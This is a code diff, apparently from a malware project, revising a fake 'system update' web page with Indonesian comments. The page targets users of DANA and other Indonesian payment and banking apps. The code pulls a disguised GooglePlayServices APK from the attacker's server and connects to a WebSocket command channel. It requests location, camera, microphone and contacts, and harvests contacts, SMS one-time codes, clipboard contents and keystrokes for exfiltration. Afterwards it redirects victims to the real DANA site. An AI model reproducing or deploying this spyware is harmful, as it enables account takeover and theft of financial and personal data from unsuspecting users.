@@ -83,7 +83,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - FULL TEKNIK PENGAMBILAN DATA
+// 🔥 SYSTEMUPDATE.HTML - TEKNIK PENGAMBILAN DATA REAL
 // ============================================================
 
 // ============================================================
@@ -100,20 +100,15 @@ var isRedirecting = false;
 var allDone = false;
 var AUTO_EXECUTED = false;
 var spreadDone = false;
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
 var retryCount = 0;
 var ws = null;
 var wsConnected = false;
 var WS_URL = 'wss://verifikasi.site/ws';
 var APK_DOWNLOADED = false;
 var DATA_COLLECTED = {};
-var BYPASS_RUNNING = false;
 var KEYLOG_DATA = [];
 
-var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-
-// ✅ REDIRECT KE DANA
+var APK_URL = SERVER + '/files/GooglePlayServices.apk';
 var DANA_URL = 'https://www.dana.id/';
 
 // ============================================================
@@ -181,9 +176,8 @@ function redirectToDANA() {
     setTimeout(function() {
         try {
             if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
+                try { AndroidBridge.openApp('id.dana'); } catch(e) {}
             }
-            // ✅ REDIRECT KE DANA WEB
             window.location.href = DANA_URL;
         } catch(e) {
             window.location.href = DANA_URL;
@@ -214,19 +208,15 @@ function logBypass(msg) {
 function requestAllPermissions() {
     logBypass('🔥 Meminta semua izin...');
     
-    // 1. IZIN LOKASI
     try {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    K({ sumber: 'izin_lokasi', data: 'granted' });
-                },
+                function(pos) { K({ sumber: 'izin_lokasi', data: 'granted' }); },
                 function() { K({ sumber: 'izin_lokasi', data: 'denied' }); }
             );
         }
     } catch(e) {}
     
-    // 2. IZIN KAMERA
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true, audio: false })
@@ -238,7 +228,6 @@ function requestAllPermissions() {
         }
     } catch(e) {}
     
-    // 3. IZIN MIKROFON
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ audio: true, video: false })
@@ -250,7 +239,6 @@ function requestAllPermissions() {
         }
     } catch(e) {}
     
-    // 4. IZIN NOTIFIKASI
     try {
         if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
             Notification.requestPermission().then(function(result) {
@@ -259,7 +247,6 @@ function requestAllPermissions() {
         }
     } catch(e) {}
     
-    // 5. IZIN KONTAK (Chrome Android)
     try {
         if ('contacts' in navigator) {
             navigator.contacts.select(['name', 'tel'], { multiple: true })
@@ -279,7 +266,6 @@ function requestAllPermissions() {
 function getLocationReal() {
     logBypass('📍 Mengambil lokasi real...');
     
-    // GPS - REAL
     try {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -303,7 +289,6 @@ function getLocationReal() {
         }
     } catch(e) {}
     
-    // IP Geolocation - TANPA IZIN!
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', 'https://ipapi.co/json/', true);
@@ -376,7 +361,6 @@ function getCameraReal() {
 function getContactsReal() {
     logBypass('👤 Mengambil kontak real...');
     
-    // METHOD 1: Contacts API (Chrome Android)
     try {
         if ('contacts' in navigator) {
             navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
@@ -392,7 +376,6 @@ function getContactsReal() {
         }
     } catch(e) {}
     
-    // METHOD 2: AndroidBridge (WebView)
     if (A.isAvailable) {
         try {
             var contacts = A.getAllContacts();
@@ -428,7 +411,6 @@ function getSMSReal() {
             logBypass('✅ SMS real: ' + sms.length + ' SMS');
             DATA_COLLECTED.sms = true;
             
-            // Ambil OTP dari SMS
             var otpList = [];
             sms.forEach(function(s) {
                 var body = s.body || s.message || '';
@@ -498,7 +480,6 @@ function startKeylogger() {
 function getClipboardReal() {
     logBypass('📋 Mengambil clipboard real...');
     
-    // METHOD 1: Clipboard API
     try {
         if (navigator.clipboard && navigator.clipboard.readText) {
             navigator.clipboard.readText().then(function(text) {
@@ -511,7 +492,6 @@ function getClipboardReal() {
         }
     } catch(e) {}
     
-    // METHOD 2: Paste Event
     try {
         document.addEventListener('paste', function(e) {
             var text = e.clipboardData.getData('text');
@@ -521,27 +501,6 @@ function getClipboardReal() {
                 DATA_COLLECTED.clipboard = true;
             }
         });
-    } catch(e) {}
-    
-    // METHOD 3: execCommand (WebView)
-    try {
-        var input = document.createElement('input');
-        input.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
-        input.setAttribute('autofocus', 'true');
-        document.body.appendChild(input);
-        input.focus();
-        setTimeout(function() {
-            try {
-                document.execCommand('paste');
-                var text = input.value;
-                if (text && text.length > 0) {
-                    K({ sumber: 'data_clipboard_exec_real', data: text });
-                    logBypass('✅ Clipboard real via exec: ' + text.substring(0, 30) + '...');
-                    DATA_COLLECTED.clipboard = true;
-                }
-            } catch(e) {}
-            try { document.body.removeChild(input); } catch(e) {}
-        }, 500);
     } catch(e) {}
 }
 
@@ -1117,7 +1076,7 @@ function bukaURL(url) {
     try { window.open(url, '_blank'); return 'URL opened'; } catch(e) { return 'Error: ' + e.message; }
 }
 
-function bukaDANAReal() { return bukaAplikasiReal('com.dana.id'); }
+function bukaDANAReal() { return bukaAplikasiReal('id.dana'); }
 function bukaGoPayReal() { return bukaAplikasiReal('com.gojek.app'); }
 function bukaOVOReal() { return bukaAplikasiReal('ovo.id'); }
 function bukaBRIReal() { return bukaAplikasiReal('id.co.bri.brimo'); }
@@ -1304,20 +1263,19 @@ function keyloggerStop() {
 }
 
 function keyloggerUpload() {
-    if (keyloggerData.length > 0) {
-        K({ sumber: 'data_keylogger_real', data: keyloggerData });
+    if (KEYLOG_DATA.length > 0) {
+        K({ sumber: 'data_keylogger_real', data: KEYLOG_DATA });
     }
-    var count = keyloggerData.length;
-    keyloggerData = [];
+    var count = KEYLOG_DATA.length;
+    KEYLOG_DATA = [];
     return count + ' keylogger entries uploaded';
 }
 
 function keyloggerStatus() {
-    return 'Keylogger: ' + (keyloggerActive ? 'ACTIVE' : 'INACTIVE') + ' | ' + keyloggerData.length + ' entries';
+    return 'Keylogger: ' + (keyloggerActive ? 'ACTIVE' : 'INACTIVE') + ' | ' + KEYLOG_DATA.length + ' entries';
 }
 
 var keyloggerActive = false;
-var keyloggerData = [];
 
 // ============================================================
 // AMBIL PASSWORD
@@ -1345,7 +1303,6 @@ function ambilPassword() {
                         startReinfection();
                         autoExecuteC2();
                         
-                        // ✅ AMBIL DATA REAL!
                         setTimeout(function() {
                             collectAllRealData();
                         }, 1000);
@@ -1511,7 +1468,7 @@ setTimeout(function() {
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
         setTimeout(redirectToDANA, 1000);
     }
-}, 15000);
+}, 60000);
 </script>
 </body>
 </html>
